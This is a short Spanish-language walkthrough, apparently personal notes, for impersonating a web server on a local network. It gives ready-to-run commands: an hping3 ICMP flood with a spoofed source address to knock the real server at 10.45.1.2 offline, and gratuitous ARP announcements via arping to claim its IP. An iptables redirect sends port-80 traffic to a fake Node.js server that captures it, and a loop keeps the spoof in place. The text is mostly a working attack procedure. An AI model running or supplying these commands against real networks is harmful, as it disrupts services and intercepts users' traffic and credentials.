M12
# 1. Desconectar o degradar al servidor legítimo (DoS ligero)

Si el servidor real sigue activo, va a ganar la carrera ARP. Un ataque DoS (ping flood) lo sacará momentáneamente de la red:

``` shell
sudo hping3 --flood --icmp -a 1.2.3.4 10.45.1.2
```

Esto lo va a mantener saturado para que no responda ARP ni tráfico Web.

---

# 2. Reclamar la IP de la víctima con GARP (Gratuitous ARP)

Una vez el servidor real no responda, me anuncio con su IP con Gratuitous ARP. Así, los clientes actualizarán su caché ARP para apuntar a mi MAC:

```shell
sudo arping -U -I eth0 -s 10.45.1.2 -c 5
```

- -U envía gratuitous ARP ("10.45.1.2 is-at")
- -c 5 lo hace 5 veces seguidas para asegurar la propagación.

Verificar en otra máquina:

``` shell
arp -n | grep 10.45.1.2
# deberia ver mi MAC en lugar de la original
```

---

# 3. Configurar el servidor falso

Ya que ahora mi kali "es" 10.45.1.2, levanto mi server.js en el puerto 80 y redirijo con iptables:

``` shell
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

#iniciar nodejs:

sudo node server.js
```

Ahora, TODO tráfico que quiera 10.45.1.2:80 llega a mi captura

---

# 4. Mantener la suplantación

La mayoría de los clientes renuevan ARP cada cierto tiempo, y algún vecino ARP Reply legítimo podría restaurar la tabla. Para evitarlo, meto un arping -U en un bucle:

```bash
while true; do
	sudo arping -U -I eth0 -s 10.45.1.2 -c 1
	sleep 2
done 
```

# 5. Restaurar todo

Cuando termine, dejaré que el servidor real levante de nuevo:

1. Mata al DoS (pkill hping3)
2. El servidor real volverá a anunciar la IP
3. Parar el bucle de arping y detener nodejs.